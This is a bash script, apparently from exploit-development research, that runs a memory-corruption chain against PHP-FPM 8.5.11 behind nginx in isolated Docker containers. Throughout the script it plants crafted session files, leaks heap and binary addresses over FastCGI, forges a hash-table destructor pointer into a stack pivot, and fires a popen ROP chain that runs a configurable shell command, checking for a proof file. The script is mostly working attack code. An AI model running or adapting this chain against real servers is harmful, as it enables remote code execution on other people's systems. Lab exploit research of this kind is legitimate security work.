#!/usr/bin/env bash
# Isolated FPM data-only ROP-pivot chain (no forged execute_data).
# Reuses the Round 37 native leak + E0/E2 mechanism, but installs the
# jump_fcontext stack pivot as the session HT pDestructor and a popen ROP
# buffer at d+0xE80. Fully isolated: own network/alias/nginx, port 9101.
set -euo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
ROOT=$(cd "$HERE/.." && pwd)
NAME=${NATIVE_NAME:-p2s-fpm-pivot}
NET=${NET:-p2s-pivot-net}
NGINX=${NGINX:-p2s-nginx-pivot}
NGINX_PORT=${NGINX_PORT:-9102}
FCGI_PORT=${FCGI_PORT:-9101}
IMAGE=${IMAGE:-php:8.5.11-fpm}
GDB_IMAGE=${GDB_IMAGE:-p2s-fpm-gdb:8511}
INI=${INI:-/usr/local/etc/php/php.ini-production}
POOL_CONF=${POOL_CONF:-zz-single.conf}
MODE=${MODE:-nogdb}
PROBE=${PROBE:-probe-rop-native.gdb}
CMD=${CMD:-id > /tmp/fpm_rop_proof}
PROOF_CONTAINER=/tmp/fpm_rop_proof

A=11111111111111111111111111111111
LB=22222222222222222222222222222222
EB=33333333333333333333333333333333

docker network inspect "$NET" >/dev/null 2>&1 || docker network create "$NET" >/dev/null
docker rm -f "$NAME" "$NGINX" >/dev/null 2>&1 || true

if [ "$MODE" = gdb ]; then
    docker run -d --name "$NAME" --network "$NET" --network-alias p2s-fpm-pivot \
        -p 127.0.0.1:"$FCGI_PORT":9000 --security-opt seccomp=unconfined \
        -v "$ROOT/www:/var/www/html:ro" \
        -v "$HERE/$POOL_CONF:/usr/local/etc/php-fpm.d/$POOL_CONF:ro" \
        -v "$HERE/$PROBE:/tmp/$PROBE:ro" \
        "$GDB_IMAGE" gdb -q -batch -x "/tmp/$PROBE" --args /usr/local/sbin/php-fpm -F -c "$INI" >/dev/null
else
    docker run -d --name "$NAME" --network "$NET" --network-alias p2s-fpm-pivot \
        -p 127.0.0.1:"$FCGI_PORT":9000 \
        -v "$ROOT/www:/var/www/html:ro" \
        -v "$HERE/$POOL_CONF:/usr/local/etc/php-fpm.d/$POOL_CONF:ro" \
        "$IMAGE" php-fpm -F -c "$INI" >/dev/null
fi
sleep 1.7
docker run -d --name "$NGINX" --network "$NET" \
    -p 127.0.0.1:"$NGINX_PORT":80 \
    -v "$HERE/nginx-pivot.conf:/etc/nginx/conf.d/default.conf:ro" \
    nginx:alpine >/dev/null
sleep 0.8

printf 'a|i:12345;b|i:12345678901234;c|i:12345678901234;d|i:12345678901234;e|i:123456789012345;' > /tmp/pivot_small
docker cp "$HERE/payload/sess_A" "$NAME:/tmp/sess_$A" >/dev/null
docker cp /tmp/pivot_small "$NAME:/tmp/sess_$LB" >/dev/null
docker exec "$NAME" chown 33:33 "/tmp/sess_$A" "/tmp/sess_$LB"
docker exec "$NAME" rm -f "$PROOF_CONTAINER" || true

PRE=${PRE:-24576}
A_URL="http://127.0.0.1:$NGINX_PORT/fpm_sess_split2.php?pre=$PRE&pad=1490900&hole=4096"

pid=$(docker top "$NAME" -o pid,comm | awk '/php-fpm/ && !/master/ {print $1; exit}')
echo "[leak] worker pid=$pid"
LEAK_TRIES=${LEAK_TRIES:-4}
HEAP=""; PIE=""
for attempt in $(seq 1 "$LEAK_TRIES"); do
    HEAP=""; PIE=""
    docker cp "$HERE/payload/sess_A" "$NAME:/tmp/sess_$A" >/dev/null
    docker exec "$NAME" chown 33:33 "/tmp/sess_$A"
    curl --max-time 30 -s -o /dev/null -w '[leak] A http=%{http_code}\n' -b "PHPSESSID=$A" "$A_URL"
    python3 "$HERE/fcgi_split.py" "$FCGI_PORT" "$LB" feffffffffffffff 0 0 0 4088 12 \
        /var/www/html/echo.php /tmp/pivot_leak.bin >/dev/null 2>&1 || true
    read -r HEAP PIE < <(python3 - <<'PY'
import struct, sys
try:
    d = open('/tmp/pivot_leak.bin', 'rb').read()
except OSError:
    sys.exit(1)
raw = None
for ln in d.split(b'\n'):
    if ln.startswith(b'v5:'):
        try:
            raw = bytes.fromhex(ln[3:].decode())
        except Exception:
            sys.exit(1)
        break
if raw is None or len(raw) < 0x3010:
    sys.exit(1)
heap = None
for off in range(0, len(raw) - 8, 8):
    q = struct.unpack_from('<Q', raw, off)[0]
    if 0x100000000000 < q < 0x800000000000 and (q & 0xfff) == 0x428:
        heap = q
        break
pie = struct.unpack_from('<Q', raw, 0x3008)[0]
if heap is None or pie <= 0x100000000000 or (pie & 0xfff) != 0x777:
    sys.exit(1)
print('%#x %#x' % (heap, pie))
PY
) || true
    if [ -n "${HEAP:-}" ] && [ -n "${PIE:-}" ]; then
        [ "$attempt" -gt 1 ] && echo "[leak] ok on attempt $attempt"
        break
    fi
    echo "[leak] attempt $attempt failed" >&2
    sleep 0.3
done
if [ -z "${HEAP:-}" ] || [ -z "${PIE:-}" ]; then
    echo "[leak] FAILED" >&2
    exit 2
fi

DRIFT=${DRIFT:-0x37000}
D=$((HEAP + 0x15cbd8 + DRIFT))
BASE=$((PIE - 0x7c9777))
PIVOT=$((BASE + 0x6bdd0e))
echo "[leak] heap=$(printf %#x $HEAP) pie=$(printf %#x $PIE)"
echo "[calc] d=$(printf %#x $D) base=$(printf %#x $BASE) pivot=$(printf %#x $PIVOT)"

# session: E0 prelude (p1..p5) + E2 (p6 arData=d+0xE80, p7 nTableSize=16,
# p8 pDestructor=PIVOT). The upload-progress zend_hash_update then finds the
# forged "upload_progress_x" key at bucket 0 and fires PIVOT on the clean
# pivot buffer before overwriting it.
printf 'p1|i:1;p2|i:1;p3|i:1;p4|i:%d;p5|i:%d;p6|i:%d;p7|i:16;p8|i:%d;' \
    $((D + 0x38)) $((D + 0xA00)) $((D + 0xE80)) "$PIVOT" > /tmp/pivot_sess_T
# build the proven nogdb (zif) fill for the calibrated d header / E0 / E2 /
# hash slots / encoder-safe keys, then overlay the pivot buffer at d+0xE80.
python3 "$HERE/mk_native_fill.py" --d "$D" --heap "$HEAP" \
    --infile "$HERE/payload/fillU.bin" --out /tmp/pivot_base.bin --nogdb >/dev/null
python3 "$HERE/mk_rop_pivot.py" --d "$D" --base "$BASE" \
    --base-fill /tmp/pivot_base.bin --out /tmp/pivot_fill.bin --cmd "$CMD" ${TEARDOWN:+--teardown}
echo -n "[sess] "; cat /tmp/pivot_sess_T; echo
docker cp /tmp/pivot_sess_T "$NAME:/tmp/sess_$EB" >/dev/null
docker exec "$NAME" chown 33:33 "/tmp/sess_$EB"

docker cp "$HERE/payload/sess_A" "$NAME:/tmp/sess_$A" >/dev/null
docker exec "$NAME" chown 33:33 "/tmp/sess_$A"
curl --max-time 30 -s -o /dev/null -w '[exploit] A http=%{http_code}\n' -b "PHPSESSID=$A" "$A_URL"
python3 "$HERE/fcgi_split.py" "$FCGI_PORT" "$EB" feffffffffffffff ${XPAD:-0} 0 1 0 0 \
    /var/www/html/index.php /tmp/pivot_b.out 12000 150 8170 /tmp/pivot_fill.bin \
    >/dev/null 2>&1 || true
sleep 0.5

if [ "$MODE" = gdb ]; then
    docker cp "$NAME:/tmp/probe_rop.log" /tmp/probe_rop.log >/dev/null 2>&1 || true
    echo "[gdb] log tail:"; tail -40 /tmp/probe_rop.log 2>/dev/null || true
fi

if docker cp "$NAME:$PROOF_CONTAINER" /tmp/pivot_proof.out >/dev/null 2>&1; then
    echo "[proof] $PROOF_CONTAINER:"
    cat /tmp/pivot_proof.out
else
    echo "[proof] missing; exploit failed" >&2
    exit 1
fi
